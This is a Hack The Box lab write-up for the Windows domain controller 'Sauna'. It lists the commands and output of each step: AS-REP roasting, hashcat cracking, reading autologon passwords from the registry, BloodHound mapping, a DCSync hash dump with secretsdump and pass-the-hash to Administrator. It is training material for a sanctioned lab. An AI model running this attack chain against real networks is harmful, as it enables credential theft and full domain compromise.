---
machine: Sauna
platform: Hack The Box
category: AD
os: Windows
difficulty: Easy
points: 20
tags: [as-rep-roasting, bloodhound, kerberoasting, autologon-creds, dcsync]
date: 2026-03-02
status: retired
summary: An Active Directory domain controller that rewards careful enumeration — turning names harvested from a public website into a username wordlist, abusing Kerberos pre-authentication weaknesses, hunting for cached credentials in the Windows registry, and mapping replication rights in BloodHound to reach full domain compromise.
---

## Enumeration

nmap scan

```bash
└─$ cat nmapbasic                                       
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-04 15:14 -0400
Nmap scan report for 10.129.62.161
Host is up (0.029s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Egotistical Bank :: Home
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-05 02:14:32Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-05-05T02:14:35
|_  start_date: N/A
|_clock-skew: 6h59m59s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.74 seconds
```

We see theres a web server so we open it up and find the team names listed in `about.html`. I made a list of all the names on the website and mutated them with a tool called username-anarchy to make a higher confidence wordlist to attempt [[ASREPRoasting]]: `git clone https://github.com/urbanadventurer/username-anarchy` then `cd username-anarchy` then `./username-anarchy --input-file names.txt > mutatednames.txt`.

## Foothold

ASREPRoast with GetNPUsers.py : `GetNPUsers.py EGOTISTICAL-BANK.local/ -usersfile mutatednames.txt -dc-ip 10.129.62.161 -no-pass -format hashcat`

```bash
┌──(kali㉿kali)-[~/htb/sauna/username-anarchy]
└─$ GetNPUsers.py EGOTISTICAL-BANK.local/ -usersfile mutatednames.txt -dc-ip 10.129.62.161 -no-pass -format hashcat
/usr/local/bin/GetNPUsers.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.14.0.dev0+20260420.123356.9afc09b9', 'GetNPUsers.py')
Impacket v0.14.0.dev0+20260420.123356.9afc09b9 - Copyright Fortra, LLC and its affiliated companies 

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:ec2e78090bfafe1bc7715d65ecb1fb3d$97a645a7df0344d66b281a9f24783830764696c5bfadd7fdb1b7f85d7398fdc0e68562a61fb73683def3150a5f0bfc5c1274e5324c6a04f9b1db7ebf16323da19ce34f53bc93a1baca48b20b57c5c163aa5823e6ec65cf6fd06cb9e8d639f43939cb1d4d42c2cd4974657606e1d0a9d0f24d9575d40c1882ac3e55006028cec13a85bfbf4afdb8ad46cde1af48cbf7836458ed99f86ea19b2d2dc6bf2930b52b188104a5db4fed548c3b37b0fd5f72cabfa0362648f36688b04478282409e6ebeb6cc096eda277e99a452139981ab48baf3625b5bc85f8eacbdcc26b3de214c0dc9f8f1ef1d3ad428d07d951f0e1dbe21bb7e6eedbee54bc63f65aa7b73cce30
```

Crack this hash with `hashcat -m 18200 hashname.txt /usr/share/wordlists/rockyou.txt`. `fsmith:Thestrokes23`.

### Evil-WinRM with Cred Set

```bash
─$ evil-winrm -i 10.129.62.161 -u 'fsmith' -p 'Thestrokes23'

*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami
egotisticalbank\fsmith
```

## Privilege Escalation

### Check Winlogon (autologon) Registry Keys

```powershell
*Evil-WinRM* PS C:\Users\FSmith\Desktop> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DefaultDomainName    REG_SZ    EGOTISTICALBANK
    DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x8c9319f7
    ShutdownFlags    REG_DWORD    0x8000022b
    DisableLockWorkstation    REG_DWORD    0x0
    DefaultPassword    REG_SZ    Moneymakestheworldgoround!

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserDefaults
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey
```

We use the DefaultUserName is `EGOTISTICALBANK\svc_loanmanager` and DefaultPassword is `Moneymakestheworldgoround!`.

#### Collect [[bloodhound-python]] data

```bash
┌──(kali㉿kali)-[~/htb/sauna/loot]
└─$ bloodhound-python -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!' -d 'EGOTISTICAL-BANK.LOCAL' -ns 10.129.62.161 -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: egotistical-bank.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Testing resolved hostname connectivity dead:beef::15ba:e9a8:23e9:e27a
INFO: Trying LDAP connection to dead:beef::15ba:e9a8:23e9:e27a
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Testing resolved hostname connectivity dead:beef::15ba:e9a8:23e9:e27a
INFO: Trying LDAP connection to dead:beef::15ba:e9a8:23e9:e27a
INFO: Found 7 users
INFO: Found 52 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Done in 00M 08S
```

Start up bloodhound GUI and import. `cd /opt/bloodhoundce` and `sudo docker-compose up -d` and `sudo docker ps`. Go to `http://localhost:8080/ui/login` and login. Using Bloodhound Outbound Connections from `SVC_LOANMGR` We see we have `GetChangesAll` and `GetChanges` permissions, the two permissions needed for a DCSync attack.

#### Performing the DCSync Attack

We will perform the DCSync attack by using Impacket's [[Secretsdump.py]] to clone and dump all NTLM hashes

```bash
┌──(kali㉿kali)-[~/htb/sauna/loot]
└─$ secretsdump.py egotistical-bank.local/svc_loanmgr:'Moneymakestheworldgoround!'@10.129.62.161
/usr/local/bin/secretsdump.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.14.0.dev0+20260420.123356.9afc09b9', 'secretsdump.py')
Impacket v0.14.0.dev0+20260420.123356.9afc09b9 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:9926dfb8bceecc179e808c14f0eaf7e5:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:25e6f76d9bce8ff226565ddabb173f253a72aea8ed5350a0dd3c4539f7bf8266
SAUNA$:aes128-cts-hmac-sha1-96:397e460cd99856746289f86621298730
SAUNA$:des-cbc-md5:9ea1f20d2f4c8580
[*] Cleaning up... 
```

### Pass the Hash for Domain Admin

`evil-winrm -i 10.129.62.161 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e`
